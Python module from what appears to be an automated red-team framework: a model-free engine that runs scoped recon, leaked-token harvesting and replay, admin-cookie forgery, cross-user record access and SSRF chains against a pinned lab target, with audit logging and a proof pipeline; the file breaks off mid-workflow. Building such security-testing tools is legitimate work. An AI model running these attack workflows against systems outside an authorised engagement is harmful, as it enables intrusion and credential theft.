"""The deterministic offensive engine — skills compiled to executable workflows.

Every arm that attacks a target today (raw, flat, swarm) waits on a language
model before a single offensive step happens. The tools exist, the skills are
declared in hands.py, the trust matrix and proof pipeline exist — but nothing
EXECUTES the declared offense as code. This module is that missing piece:

  - Each Skill declared in redteam/hands.py gets a workflow here: the same
    entry evidence -> steps -> exit -> proof contract, implemented against the
    registered tools (never raw requests), so scope, rate limits, audit,
    traffic recording and the trust ladder hold exactly as for an LLM agent.
  - The engine runs the orchestrator's round shape deterministically:
    recon -> crosschecked leads -> class-specialist workflows -> verify pass
    (the same FindingStore pending -> promote pipeline, executed by the
    verify_finding_independently tool) -> ground-truth scoring via bench.
  - Zero model calls. That makes it (a) the live-fire harness proving the
    machine end-to-end, (b) the regression offense every new tool must pass
    ("can the machinery alone find the planted bug?"), and (c) callable
    fallback workflows the LLM specialists can invoke step-by-step when
    improvisation stalls.

Honesty rules carried over unchanged:
  - Leads are NEVER findings. Every lead passes crosscheck_lead (its matrix
    second method) before a workflow spends proof budget on it.
  - Proof = the tools' k-of-n reproduction with negative control; the verdict
    belongs to the pipeline (pending_verification), confirmed only by the
    independent verify pass.
  - Credentials come from the RoE (engagement "credentials" block, seeded lab
    accounts) or from harvest (extract_secrets over material the run itself
    obtained, registered via try_credential). Nothing is invented.

    python -m redteam.offensive --engagement runs/x/engagement.yaml \
        --base-url http://127.0.0.1:8894 --out runs/x/offensive
"""

from __future__ import annotations

import json
import re
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Callable

from .config import Engagement, load_engagement
from .hypothesize import Brain, Hypothesis, ID_SHAPE
from .tools import Tool, ToolContext, build_registry
from .tools.http import fetch_once

_INTROSPECTION_Q = ("{ __schema { queryType { fields { name "
                    "args { name type { name kind ofType { name kind } } } "
                    "type { name kind ofType { name kind } } } } "
                    "mutationType { fields { name args { name "
                    "type { name kind ofType { name kind } } } } } } }")


# ----------------------------------------------------------------------------
# Leads — first-class, crosschecked before use
# ----------------------------------------------------------------------------

@dataclass
class Lead:
    """A recon claim. Never trusted until its trust class says so:
    'tool-claim' needs the matrix second method (crosscheck_lead);
    'first-party' is material this engine fetched and read ITSELF — the
    observation IS the evidence, same as http_probe's."""
    kind: str            # path | param | doc | host | token
    url: str = ""
    param: str = ""
    method: str = "GET"
    source_tool: str = ""
    claim: str = ""
    trust: str = "tool-claim"            # first-party | tool-claim
    crosscheck: str = "uncorroborated"   # -> corroborated | exempt | first-party
    note: str = ""

    def believed(self) -> bool:
        return self.crosscheck in {"corroborated", "exempt", "first-party"}


def _parse_json_loose(text: str):
    try:
        return json.loads(text)
    except (json.JSONDecodeError, TypeError):
        return None


# ----------------------------------------------------------------------------
# The engine
# ----------------------------------------------------------------------------

class OffensiveEngine:
    """Round-shaped, model-free execution of the declared offense."""

    def __init__(self, engagement: Engagement, tools: dict[str, Tool] | None = None,
                 ctx: ToolContext | None = None, creds: dict | None = None,
                 max_rounds: int = 3, log: Callable[..., None] = print,
                 llm_chat: Callable[..., str] | None = None):
        self._eng = engagement
        self._tools = tools if tools is not None else build_registry(
            enable_sandbox=False, enable_browser=False)
        self._ctx = ctx
        self._creds = creds or (engagement.raw.get("credentials") or {})
        self._max_rounds = max_rounds
        self._log = log
        self._leads: list[Lead] = []
        self._base: str = ""
        self._brain: Brain | None = None
        self.rounds: list[dict] = []
        # the model amplifier: when present, it proposes bets into the SAME
        # queue under the SAME discipline (see llm/planner.py). Never required.
        self._llm_chat = llm_chat

    # -- plumbing -------------------------------------------------------------

    def _tool(self, name: str) -> Tool:
        t = self._tools.get(name)
        if t is None:
            raise RuntimeError(f"offensive engine requires tool '{name}' "
                               f"(not in registry: {sorted(self._tools)[:8]}...)")
        return t

    def _run_tool(self, name: str, **kwargs) -> dict:
        """Run a registered tool; parse its JSON result. Non-JSON results
        (BLOCKED/ERROR) become {'ok': False, 'note': <text>}."""
        raw = self._tool(name).run(self._ctx, **kwargs)
        out = _parse_json_loose(raw) if isinstance(raw, str) and raw.startswith("{") else None
        if out is None:
            return {"ok": False, "note": raw if isinstance(raw, str) else str(raw)}
        return out

    def _fetch(self, req: dict, tool: str = "offensive") -> tuple[int, str]:
        status, body, _elapsed, headers = fetch_once(self._ctx, req, tool=tool)
        # EVERY response the run obtains is an observation for the Brain — the
        # adaptive loop rides on material we already hold (first-party only).
        if self._brain is not None:
            try:
                self._brain.observe(req.get("url", ""), status, body,
                                    headers, req.get("method", "GET"),
                                    req_body=req.get("body") or "")
            except Exception:  # the brain must never break the run
                pass
        return status, body

    def _preobserve(self, req: dict) -> tuple[int, str]:
        """Cheap single-shot triage of a payload/branch BEFORE spending the
        proof pipeline's k-of-n budget: the conditions we hand verify_vulnerability
        use the OBSERVED status, never an assumed one."""
        return self._fetch(req, tool="offensive.triage")

    def _audit(self, event: str, **fields) -> None:
        self._ctx.audit.record(event, **fields)

    def _resolve_raw(self, preview: str) -> str:
        """extract_secrets stores candidates MASKED (the transcript never holds
        raw secrets); the raw value lives in the engine's own access graph. This
        resolves a candidate preview exactly the way try_credential does."""
        from .access import CREDENTIAL
        node = self._ctx.access and self._ctx.access._nodes.get(
            f"{CREDENTIAL}:{preview}")
        return (node.attrs.get("value") or "") if node else ""

    def _crosscheck(self, lead: Lead) -> bool:
        """Second method or it doesn't count. Exempt classes pass as-is."""
        res = self._run_tool("crosscheck_lead", tool=lead.source_tool or lead.kind,
                             claim=lead.claim or f"{lead.kind} {lead.url}",
                             url=lead.url, param=lead.param)
        lead.crosscheck = str(res.get("verdict", "unverifiable"))
        self._audit("offensive.lead.crosschecked", kind=lead.kind, url=lead.url,
                    verdict=lead.crosscheck)
        return lead.crosscheck in {"corroborated", "exempt"}

    # -- entry ----------------------------------------------------------------

    def run(self, objective_text: str = "") -> dict:
        t0 = time.time()
        base = getattr(self, "_base_override", "")
        if not base:
            raise RuntimeError("no base URL: the caller pins the target explicitly "
                               "(engine._base_override / --base-url)")
        self._base = base.rstrip("/")
        self._brain = Brain(self._ctx, self._base, creds=self._creds,
                            log=self._log)
        self._audit("offensive.run.start", base=self._base, creds=sorted(self._creds))

        summary: dict = {"base": self._base, "rounds": [], "leads": 0,
                         "crosschecked": 0, "findings": 0, "pending": 0,
                         "confirmed": 0, "hypotheses": []}
        for rnd in range(1, self._max_rounds + 1):
            rlog: dict = {"round": rnd}
            if rnd == 1:
                rlog["recon"] = self._round_recon()
                # believed path leads become the Brain's unexplored doors —
                # the recon/exploit bridge the adaptive loop feeds on
                self._brain.ingest_paths(sorted(
                    {l.url for l in self._leads
                     if l.believed() and l.url and l.kind == "path"}))
                rlog["workflows"] = self._round_exploit()
                # The Brain: signal-driven bets over the template workflows —
                # this is what finds bugs the templates were never written for.
                rlog["hypotheses"] = self._brain_rounds()
            else:
                # Later rounds: workflows fired once; the round is chaining
                # (results mint new bets) plus the pipeline's verdict.
                rlog["hypotheses"] = self._brain_rounds()
            rlog["verify"] = self._verify_pass()
            summary["rounds"].append(rlog)
            summary["hypotheses"].extend(rlog.get("hypotheses", []))
            obj = self._eng.objective
            if obj is not None and getattr(obj, "achieved", False):
                rlog["objective"] = "achieved"
                break
            if not self._ctx.findings.pending() and not self._brain.queue:
                rlog["halt"] = "nothing pending, no bets left — pipeline has ruled"
                break
        fstore = self._ctx.findings
        summary["leads"] = len(self._leads)
        summary["crosschecked"] = sum(1 for l in self._leads if l.crosscheck == "corroborated")
        summary["findings"] = len(fstore.all())
        summary["pending"] = len(fstore.pending())
        summary["confirmed"] = sum(1 for f in fstore.all()
                                   if f.confidence == "confirmed")
        summary["elapsed_s"] = round(time.time() - t0, 1)
        self._audit("offensive.run.done", **{k: v for k, v in summary.items()
                                             if k != "rounds"})
        return summary

    # -- ROUND 1a: recon (surface -> crawl/discover -> docs -> params) ---------

    def _round_recon(self) -> dict:
        out: dict = {"surface": [], "paths": [], "params": [], "docs": [],
                     "app_name": ""}
        # 1. what is alive (ground-truth class: reads the RoE allowlist itself)
        scan = self._run_tool("surface_scan")
        alive = scan.get("alive", []) if scan.get("ok", True) else []
        out["surface"] = alive
        self._audit("offensive.recon.surface", alive=alive)

        # 2. wrapped-binary claims (ffuf/katana/arjun classes): leads from these
        #    are tool-claims and MUST crosscheck. They may be unavailable
        #    (no sandbox) — recon then rests entirely on first-party reads.
        for tool, kw in (("crawl", {"depth": 2}),
                         ("content_discovery", {"wordlist": "common"})):
            res = self._run_tool(tool, target=self._base, reason="map the surface",
                                 **kw)
            for lead in res.get("leads", []):
                url = lead.get("url") or ""
                if not url:
                    continue
                param = ""
                if "?" in url:
                    qs = url.split("?", 1)[1]
                    param = qs.split("=", 1)[0] if "=" in qs else qs
                self._leads.append(Lead(kind="path" if not param else "param",
                                        url=url.split("?")[0], param=param,
                                        method=lead.get("method", "GET"),
                                        source_tool=tool, trust="tool-claim",
                                        claim=f"{tool} saw {url}"))

        # 3. FIRST-PARTY reads: this engine fetches and parses material itself.
        #    (a) the landing page: links, form actions, and the app name
        st, home = self._fetch({"method": "GET", "url": self._base + "/"},
                               tool="http_probe")
        app_name = ""
        if st == 200 and home:
            m = re.search(r"<title[^>]*>([^<]{2,64})</title>", home, re.I)
            if m:
                app_name = m.group(1).strip()
                out["app_name"] = app_name
                self._app_name = app_name
            for href in re.findall(r"""(?:href|action)=["']([^"'#\s]{1,200})["']""",
                                   home):
                path = href.split("?")[0]
                if path.startswith("/") and not path.startswith("//"):
                    self._leads.append(Lead(kind="path", url=path,
                                            source_tool="homepage",
                                            trust="first-party",
                                            claim=f"linked from /: {path}",
                                            note=href))
                if "?" in href and href.startswith("/"):
                    qs = href.split("?", 1)[1]
                    for p in [x.split("=")[0] for x in qs.split("&") if x]:
                        self._leads.append(Lead(kind="param", url=path, param=p,
                                                source_tool="homepage",
                                                trust="first-party",
                                                claim=f"form param {p} on {path}"))
        #    (b) a bounded high-yield path probe (my own observations, capped)
        for path in ("/robots.txt", "/openapi.json", "/swagger.json", "/sitemap.xml",
                     "/docs", "/api", "/api/", "/admin", "/admin/", "/login",
                     "/debug/", "/backup/", "/actuator", "/server-status",
                     "/.env", "/.git/HEAD", "/.env.bak", "/config.json",
                     "/graphql", "/api/graphql", "/graphiql"):
            st, body = self._fetch({"method": "GET", "url": self._base + path},
                                   tool="http_probe")
            if st == 200 and (body or "").strip():
                self._leads.append(Lead(kind="path", url=path,
                                        source_tool="path-probe",
                                        trust="first-party",
                                        claim=f"GET {path} -> 200 ({len(body)}b)",
                                        note=body[:2000]))
        # 4. deterministic doc parsing (openapi paths+params, robots disallows)
        for lead in [l for l in self._leads if l.source_tool == "path-probe"]:
            if re.search(r"\.json$|swagger", lead.url):
                doc = _parse_json_loose(lead.note) or \
                    _parse_json_loose(self._fetch({"method": "GET",
                                                   "url": self._base + lead.url},
                                                  tool="http_probe")[1])
                if isinstance(doc, dict) and doc.get("paths"):
                    for p, spec in doc["paths"].items():
                        for m in ("get", "post", "put", "delete", "patch"):
                            if m in (spec or {}):
                                self._leads.append(Lead(
                                    kind="path", url=p, method=m.upper(),
                                    source_tool="openapi", trust="first-party",
                                    claim=f"documented {m.upper()} {p}",
                                    note=json.dumps(spec[m])[:2000]))
                        if isinstance(spec, dict) and "parameters" in spec:
                            for prm in spec["parameters"]:
                                self._leads.append(Lead(
                                    kind="param", url=p, param=prm.get("name", ""),
                                    source_tool="openapi", trust="first-party",
                                    claim=f"documented param {prm.get('name')}"))
            elif lead.url == "/robots.txt":
                for line in lead.note.splitlines():
                    if line.lower().startswith("disallow:"):
                        self._leads.append(Lead(
                            kind="path", url=line.split(":", 1)[1].strip(),
                            source_tool="robots", trust="first-party",
                            claim=f"robots disallows {line.strip()}"))
        # 5. arjun-class param discovery on the base (tool-claim, bounded)
        res = self._run_tool("param_discovery", target=self._base,
                             reason="find hidden parameters")
        for p in res.get("leads", []):
            name = p.get("param", "") if isinstance(p, dict) else str(p)
            if name:
                self._leads.append(Lead(kind="param", url="/", param=name,
                                        source_tool="param_discovery",
                                        claim=f"hidden param {name}"))
        # 6. trust discipline: tool-claims pass the matrix second method;
        #    first-party observations stand on their own fetch.
        kept = []
        for lead in self._leads:
            ok = (self._crosscheck(lead) if lead.trust == "tool-claim"
                  else self._mark_first_party(lead))
            if ok:
                kept.append(lead)
        self._leads = kept
        paths = sorted({l.url for l in self._leads
                        if l.kind == "path" and l.url and l.believed()})
        params = sorted({(l.url, l.param) for l in self._leads
                         if l.kind == "param" and l.param and l.believed()})
        out["paths"], out["params"] = paths, [list(p) for p in params]
        return out

    def _mark_first_party(self, lead: Lead) -> bool:
        lead.crosscheck = "first-party"
        return True

    # -- ROUND 1b: class workflows (hands.py Skills, executable) --------------

    def _round_exploit(self, round: int = 1) -> list[str]:
        done = []
        # a05: doc/config leak hunt (openapi descriptions, robots-nudged paths)
        if self._workflow_doc_leak():
            done.append("doc-leak-hunt")
        # a05: backup/dump hunt over discovered backup-ish paths
        if self._workflow_backup_hunt():
            done.append("backup-hunt")
        # a07/a01: principals from RoE creds, then the access differential
        if self._workflow_auth_map():
            done.append("auth-boundary-map")
        if self._workflow_access_differential():
            done.append("idor-differential")
        # a10: SSRF via url-bearing endpoints, chained on harvested tokens
        if self._workflow_ssrf():
            done.append("ssrf-callback-map")
        # a03: deterministic reflection map -> READY check_spec -> prove
        if self._workflow_reflect_prove():
            done.append("reflect-map-prove")
        self._audit("offensive.workflows.done", round=round, ran=done)
        return done

    # ---- workflow: doc/config leak (a05 exposure-hunt) ----------------------

    def _doc_like_paths(self) -> list[Lead]:
        return [l for l in self._leads
                if re.search(r"openapi|swagger|\.json$|robots|debug|env|config",
                             l.url or "")]

    def _workflow_doc_leak(self) -> bool:
        hit = False
        for lead in self._doc_like_paths():
            url = self._base + lead.url if lead.url.startswith("/") else lead.url
            status, body = self._fetch({"method": "GET", "url": url},
                                       tool="http_probe")
            if status != 200 or not body:
                continue
            # harvest candidates from OUR OWN fetched material (offline-parse)
            res = self._run_tool("extract_secrets", text=body[:20000],
                                 context=f"doc:{lead.url}")
            cands = [c for c in res.get("candidates", [])
                     if c.get("confidence") in {"high", "medium"}]
            if not cands:
                continue
            # a leaked token only matters if it AUTHENTICATES. try_credential is
            # GET-only; when the probe is a POST endpoint we validate with a direct
            # fetch (benign mirror URL) and register the session ourselves.
            probe = next((l for l in self._leads if l.method == "POST"
                          and re.search(r"import|fetch|url|upload", l.url or "")), None)
            if probe is None:
                continue
            probe_path = probe.url if probe.url.startswith("/") else "/" + probe.url
            probe_url = self._base + probe_path
            for c in cands[:3]:
                token = self._resolve_raw((c.get("preview") or "").strip()) \
                    or (c.get("preview") or "").strip()
                if not re.fullmatch(r"[\w\-.]{8,64}", token):
                    continue
                hdrs = {"Authorization": f"Bearer {token}"}
                status, resp_body = self._fetch(
                    {"method": "POST", "url": probe_url, "headers": hdrs,
                     "body": json.dumps({"url": self._base + "/"})},
                    tool="try_credential")
                if status != 200:
                    continue
                self._ctx.sessions.set("harvest", hdrs)
                self._audit("offensive.harvest.registered", context=lead.url,
                            kind=c.get("kind"))
                # disclosure finding: the doc/env leak itself, negative control =
                # a random sibling path (must NOT leak)
                ctrl = {"method": "GET",
                        "url": self._base + f"/no-such-{int(time.time())}"}
                payload = {"method": "GET", "url": url}
                res_v = self._run_tool(
                    "verify_vulnerability",
                    title=f"Sensitive token disclosure at {lead.url}",
                    severity="high", target=lead.url,
                    summary=f"{lead.url} serves material containing a live "
                            f"credential ({c.get('kind')}); replayed with the "
                            f"harvested token against {probe.url} -> 200.",
                    requests={"payload": payload, "control": ctrl},
                    conditions=[{"type": "status", "request": "payload",
                                 "equals": 200},
                                {"type": "body_regex", "request": "payload",
                                 "pattern": re.escape(token), "present": True}],
                    negative_control=ctrl,
                    cwe="CWE-200",
                    recommendation="Strip credentials from generated docs and "
                                   "debug endpoints; require auth for /debug.")
                if res_v.get("recorded"):
                    hit = True
                break
        return hit

    # ---- workflow: backup/dump hunt (a05) ------------------------------------

    def _workflow_backup_hunt(self) -> bool:
        hit = False
        # app-name conventions (the real-world backup naming scheme): prefer the
        # landing page's own <title>, fall back to the host label
        name_src = (getattr(self, "_app_name", "") or
                    self._base.split("//")[-1].split(":")[0].split("/")[0])
        host = re.sub(r"[^a-z0-9]", "", name_src.lower()) or "app"
        conventions = [f"{host}-2023.sql", f"{host}-2024.sql", f"{host}-2025.sql",
                       f"{host}-2026.sql", "db.sql", "dump.sql", "backup.sql",
                       f"{host}.sql", f"{host}.zip", f"{host}.tar.gz"]
        for lead in [l for l in self._leads if re.search(
                r"backup|dump|\.sql|\.zip|\.tar|\.bak", l.url or "")]:
            dirurl = lead.url if lead.url.startswith("/") else "/" + lead.url
            candidates = [dirurl] if re.search(r"\.(sql|zip|tar|gz|bak)$", dirurl) \
                else [dirurl.rstrip("/") + "/" + name for name in conventions]
            for cand in candidates:
                url = self._base + cand
                st, body = self._preobserve({"method": "GET", "url": url})
                if st != 200 or len(body) < 64:
                    continue
                if not re.search(r"CREATE TABLE|INSERT INTO|-- MySQL|"
                                 "-- PostgreSQL", body[:4000]):
                    continue
                ctrl = {"method": "GET",
                        "url": self._base + f"/no-such-{int(time.time())}"}
                st_c, _ = self._preobserve(ctrl)
                res_v = self._run_tool(
                    "verify_vulnerability",
                    title=f"Exposed database dump at {cand}",
                    severity="high", target=cand,
                    summary=f"{cand} serves a SQL dump unauthenticated "
                            f"({len(body)} bytes, CREATE TABLE observed); a "
                            f"random sibling path is {st_c}.",
                    requests={"payload": {"method": "GET", "url": url},
                              "control": ctrl},
                    conditions=[{"type": "status", "request": "payload",
                                 "equals": 200},
                                {"type": "body_regex", "request": "payload",
                                 "pattern": "CREATE TABLE|INSERT INTO",
                                 "present": True},
                                {"type": "status", "request": "control",
                                 "equals": st_c}],
                    negative_control=ctrl, cwe="CWE-200",
                    recommendation="Remove dumps from the webroot; deny listing.")
                if res_v.get("recorded"):
                    hit = True
        return hit

    # ---- workflow: auth boundary map (a07/a01) -------------------------------

    def _login_lead(self) -> Lead | None:
        return next((l for l in self._leads
                     if "login" in (l.url or "").lower()
                     or "auth" in (l.url or "").lower()), None)

    def _workflow_auth_map(self) -> bool:
        if not self._creds:
            return False
        login = self._login_lead()
        ok_any = False
        for label, pack in sorted(self._creds.items()):
            if pack.get("token"):
                self._run_tool("set_session", label=label,
                               headers={"Authorization": f"Bearer {pack['token']}"},
                               note="RoE-seeded principal")
                ok_any = True
                continue
            # the door: a discovered login endpoint, or the RoE creds block's
            # own login_url (the operator hands you the accounts AND the door)
            login_url = (login.url if login is not None
                         else pack.get("login_url") or "")
            if not login_url or not pack.get("password"):
                continue
            url = self._base + login_url if login_url.startswith("/") else login_url
            body = json.dumps({"user": label, "password": pack["password"]})
            res = self._run_tool("authenticate", label=label, url=url,
                                 method=(login.method if login else "POST"),
                                 body=body,
                                 token_json_path=pack.get("token_field", "token"))
            self._audit("offensive.principal", label=label, ok=res.get("ok"))
            ok_any = ok_any or bool(res.get("ok"))
        return ok_any and bool(self._ctx.sessions)

    # ---- workflow: two-principal access differential (a01) -------------------

    def _gated_leads(self) -> list[Lead]:
        return [l for l in self._leads
                if re.search(r"admin|export|user|pm|message|private|internal",
                             (l.url or "").lower())]

    def _workflow_access_differential(self) -> bool:
        principals = [l for l in sorted(self._creds)
                      if self._ctx.sessions and self._ctx.sessions.get(l)]
        if len(principals) < 2:
            return False
        # low = a NON-admin principal when one exists (an admin token passes the
        # gate without forgery, which would make the control reproduce)
        low = next((p for p in principals
                    if not re.search(r"admin|root|super|owner", p)), principals[0])
        hit = False
        # Explicit headers, NOT session_label: authenticate stores the login's
        # Set-Cookie in the session, and session headers WIN on merge — a forged
        # Cookie in the request would be silently overwritten. We read OUR OWN
        # captured bearer and build the two identities by hand.
        low_hdrs = dict(self._ctx.sessions.get(low).headers)
        others = [p for p in principals if p != low]
        for lead in self._gated_leads():
            path = lead.url if lead.url.startswith("/") else "/" + lead.url
            # 1) baseline: the gate must actually deny before forgery means anything
            st_un, body_un = self._fetch({"method": lead.method, "url": self._base + path},
                                         tool="http_probe")
            if st_un not in (401, 403, 404):
                continue  # wide open (different class) or not a gate
            # resolve the resource parameter the gate guards (user/owner/id=...)
            target_user = next((o for o in others
                                if not re.search(r"admin|root|super", o)), None)
            probe_path = path
            if re.search(r"[?&](user|owner|account|id)=", path) is None:
                if target_user:
                    probe_path = f"{path}{'&' if '?' in path else '?'}user={target_user}"
                else:
                    continue  # no resolvable resource -> nothing to own
            # 2) role-cookie forgery (CWE-284): the gate trusting a client cookie.
            #    Isolation: ask for the LOW principal's OWN record — ownership is
            #    irrelevant here, only the gate's trust decision is under test.
            own_user = re.search(r"(user|owner|account|id)=([^&]+)", probe_path)
            own_path = re.sub(r"(user|owner|account|id)=[^&]+",
                              rf"\g<1>={low}", probe_path) if own_user else probe_path
            for variant in ("role=admin", "role=administrator", "admin=1",
                            "is_admin=true"):
                payload = {"method": lead.method, "url": self._base + own_path,
                           "headers": {**low_hdrs, "Cookie": variant}}
                control = {"method": lead.method, "url": self._base + own_path,
                           "headers": dict(low_hdrs)}
                st_p, _ = self._preobserve(payload)
                if st_p != 200:
                    continue  # this forgery variant does not pass the gate
                st_c, _ = self._preobserve(control)
                if st_c == 200:
                    continue  # control reproduces: the gate never mattered
                res_v = self._run_tool(
                    "verify_vulnerability",
                    title=f"Client-controlled role cookie bypasses the admin gate "
                          f"({path})",
                    severity="high", target=path,
                    summary=f"{path} denies the authenticated low-privilege "
                            f"principal ({st_c} without cookie) but accepts the "
                            f"same token with client-supplied Cookie '{variant}' "
                            f"— authorization derived from client state "
                            f"(CWE-284).",
                    requests={"payload": payload, "control": control},
                    conditions=[{"type": "status", "request": "payload",
                                 "equals": 200},
                                {"type": "status", "request": "control",
                                 "equals": st_c}],
                    negative_control=control, cwe="CWE-284",
                    recommendation="Derive authorization from the token, never "
                                   "from client-supplied cookies/headers.")
                if res_v.get("recorded"):
                    hit = True
                    break
            # 3) cross-principal object access (CWE-639): low principal +
            #    the (now known-trusted) forged cookie reading ANOTHER
            #    principal's record; control = same request WITHOUT the forgery.
            if target_user:
                idor_path = re.sub(r"(user|owner|account|id)=[^&]+",
                                   rf"\g<1>={target_user}", probe_path)
                payload = {"method": lead.method, "url": self._base + idor_path,
                           "headers": {**low_hdrs, "Cookie": "role=admin"}}
                control = {"method": lead.method, "url": self._base + idor_path,
                           "headers": dict(low_hdrs)}
                st_p, body_p = self._preobserve(payload)
                st_c, _ = self._preobserve(control)
                if st_p != 200 or st_c == 200:
                    continue
                # The payload must carry the OTHER principal's material, not
                # merely any 200. Reference body: an admin principal (the
                # legitimate cross-user reader) when one exists — an admin-gated
                # export denies its own owner too, so the owner's session often
                # CANNOT serve as the reference; owner-session is the fallback
                # for owner-readable resources.
                ref_label = next((p for p in principals
                                  if re.search(r"admin", p)), target_user)
                ref_hdrs = dict(self._ctx.sessions.get(ref_label).headers)
                st_b, body_b = self._preobserve(
                    {"method": lead.method, "url": self._base + idor_path,
                     "headers": ref_hdrs})
                own_body = self._fetch({"method": lead.method,
                                        "url": self._base + idor_path,
                                        "headers": dict(low_hdrs)},
                                       tool="offensive.triage")[1]
                distinctive = [t for t in dict.fromkeys(
                    re.findall(r"[\w\-]{10,}", body_b or ""))
                    if t not in (own_body or "")][:3]
                if not distinctive:
                    continue
                marker = distinctive[0]
                if marker not in (body_p or ""):
                    continue
                res_v = self._run_tool(
                    "verify_vulnerability",
                    title=f"Cross-principal object access without ownership "
                          f"check ({idor_path})",
                    severity="critical", target=idor_path,
                    summary=f"Principal '{low}' retrieves '{target_user}''s "
                            f"record via {idor_path}: the response carries "
                            f"material ('{marker[:8]}...') that exists only in "
                            f"'{target_user}''s own view; the same request "
                            f"without the client-trusted role cookie is denied "
                            f"({st_c}) — the object owner is never checked "
                            f"(CWE-639).",
                    requests={"payload": payload, "control": control},
                    conditions=[{"type": "status", "request": "payload",
                                 "equals": 200},
                                {"type": "body_regex", "request": "payload",
                                 "pattern": re.escape(marker),
                                 "present": True},
                                {"type": "status", "request": "control",
                                 "equals": st_c}],
                    negative_control=control, cwe="CWE-639",
                    recommendation="Enforce object-level authorization against "
                                   "the authenticated principal on EVERY read.")
                if res_v.get("recorded"):
                    hit = True
        return hit

    # ---- workflow: SSRF chain (a10) -------------------------------------------

    def _url_bearing_endpoints(self) -> list[Lead]:
        out = []
        for l in self._leads:
            if l.method == "POST" and re.search(r"import|fetch|url|proxy|webhook",
                                                (l.url or "").lower()):
                out.append(l)
            elif l.note and re.search(r'"url"|\burl\b.*(string|required)',
                                      l.note):
                out.append(l)
        return out

    def _workflow_ssrf(self) -> bool:
        hit = False
        ports = sorted({p for p in self._eng.allowed_ports if p not in (80, 443)})
        hosts = ["127.0.0.1", "localhost"]
        for lead in self._url_bearing_endpoints():
            path = lead.url if lead.url.startswith("/") else "/" + lead.url
            url = self._base + path
            hdrs = {}
            st, body = self._fetch({"method": "POST", "url": url, "body": "{}"},
                                   tool="http_probe")
            if st == 401 and self._ctx.sessions:
                sess = self._ctx.sessions.get("harvest") or \
                    next((self._ctx.sessions.get(k) for k in sorted(self._creds)
                          if self._ctx.sessions.get(k)), None)
                if not sess:
                    continue
                hdrs = dict(sess.headers)
                st, body = self._fetch({"method": "POST", "url": url,
                                        "headers": hdrs, "body": "{}"},
                                       tool="http_probe")
            if st not in (200, 400, 422, 500):
                continue
            for h in hosts:
                for p in ports:
                    internal = f"http://{h}:{p}/"
                    payload = {"method": "POST", "url": url,
                               "body": json.dumps({"url": internal}),
                               "headers": hdrs}
                    control = {"method": "POST", "url": url,
                               "body": json.dumps({"url": f"http://{h}:{p+7777}/"}),
                               "headers": hdrs}
                    st_p, body_p = self._preobserve(payload)
                    st_c, body_c = self._preobserve(control)
                    if st_p >= 400 or (body_p or "").strip() == (body_c or "").strip():
                        continue
                    # distinctive internal material: something in the SSRF'd
                    # response that the dead-port control cannot produce
                    distinctive = [t for t in dict.fromkeys(
                        re.findall(r"[\w\-]{8,}", body_p or ""))
                        if t not in (body_c or "")][:3]
                    if not distinctive:
                        continue
                    marker = distinctive[0]
                    res_v = self._run_tool(
                        "verify_vulnerability",
                        title=f"Server-side request forgery via {path} reaches "
                              f"internal service {h}:{p}",
                        severity="critical", target=path,
                        summary=f"{path} fetches a caller-supplied URL from the "
                                f"server: pointing it at {internal} returns the "
                                f"INTERNAL service's own response (marker "
                                f"'{marker[:8]}...' absent from the dead-port "
                                f"control) — no egress allowlist (CWE-918).",
                        requests={"payload": payload, "control": control},
                        conditions=[{"type": "body_regex", "request": "payload",
                                     "pattern": re.escape(marker),
                                     "present": True}],
                        negative_control=control, cwe="CWE-918",
                        recommendation="Allowlist egress destinations; deny "
                                       "link-local and loopback targets.")
                    if res_v.get("recorded"):
                        hit = True
                    # -- the chain: internal service banner -> token disclosure
                    # -> authenticated internal secret. Each stage observed
                    # before the pipeline is asked to reproduce it.
                    tok = self._chase_internal_token()
                    if tok:
                        chain_url = f"http://{h}:{p}/internal/secret?token={tok}"
                        chain_payload = {"method": "POST", "url": url,
                                         "body": json.dumps({"url": chain_url}),
                                         "headers": hdrs}
                        st_cp, body_cp = self._preobserve(chain_payload)
                        if st_p and "secret" in (body_cp or "").lower() \
                                and distinctive:
                            res_c = self._run_tool(
                                "verify_vulnerability",
                                title=f"SSRF chain: {path} -> internal secret "
                                      f"(token harvested from a disclosure)",
                                severity="critical", target=path,
                                summary=f"Chained: a disclosure harvested an "
                                        f"internal token; {path} fetched "
                                        f"{chain_url} with it and returned the "
                                        f"internal secret object.",
                                requests={"payload": chain_payload,
                                          "control": control},
                                conditions=[
                                    {"type": "body_regex", "request": "payload",
                                     "pattern": "secret|FLAG\\{",
                                     "present": True}],
                                negative_control=control, cwe="CWE-918",
                                recommendation="Egress allowlist + rotate the "
                                               "leaked internal token.")
                            if res_c.get("recorded"):
                                hit = True
        return hit

    def _chase_internal_token(self) -> str:
        """Look at disclosure-ish leads for an internal token we have NOT yet
        registered; harvest material only from responses WE obtained."""
        for lead in self._doc_like_paths():
            if not re.search(r"debug|env|secret|internal", lead.url or ""):
                continue
            url = self._base + lead.url if lead.url.startswith("/") else lead.url
            st, body = self._fetch({"method": "GET", "url": url},
                                   tool="http_probe")
            if st != 200 or not body:
                continue
            sec = self._run_tool("extract_secrets", text=body[:20000],
                                 context=f"chain:{lead.url}")
            for c in sec.get("candidates", []):
                tok = self._resolve_raw((c.get("preview") or "").strip()) \
                    or (c.get("preview") or "").strip()
                if re.fullmatch(r"[\w\-.]{8,64}", tok) and \
                        not self._ctx.sessions.get("internal"):
                    # record the disclosure as its OWN finding (the token in a
                    # debug/env body is CWE-200 regardless of the chain)
                    ctrl = {"method": "GET",
                            "url": self._base + f"/no-such-{int(time.time())}"}
                    self._run_tool(
                        "verify_vulnerability",
                        title=f"Internal token disclosed at {lead.url}",
                        severity="high", target=lead.url,
                        summary=f"{lead.url} serves an internal credential "
                                f"({c.get('kind')}) to unauthenticated callers; "
                                f"used to authenticate to the internal service "
                                f"in the SSRF chain.",
                        requests={"payload": {"method": "GET", "url": url},
                                  "control": ctrl},
                        conditions=[{"type": "status", "request": "payload",
                                     "equals": 200},
                                    {"type": "body_regex", "request": "payload",
                                     "pattern": re.escape(tok), "present": True}],
                        negative_control=ctrl, cwe="CWE-200",
                        recommendation="Require auth for debug endpoints; rotate "
                                       "the exposed token.")
                    self._ctx.sessions.set("internal",
                                           {"X-Internal-Token": tok})
                    return tok
        return ""

    # ---- workflow: reflect-map-prove (a03) ------------------------------------

    def _workflow_reflect_prove(self) -> bool:
        hit = False
        by_url: dict[str, list[str]] = {}
        for l in self._leads:
            if l.param and l.param not in ("", None):
                by_url.setdefault(l.url, [])
                if len(by_url[l.url]) < 5 and l.param not in by_url[l.url]:
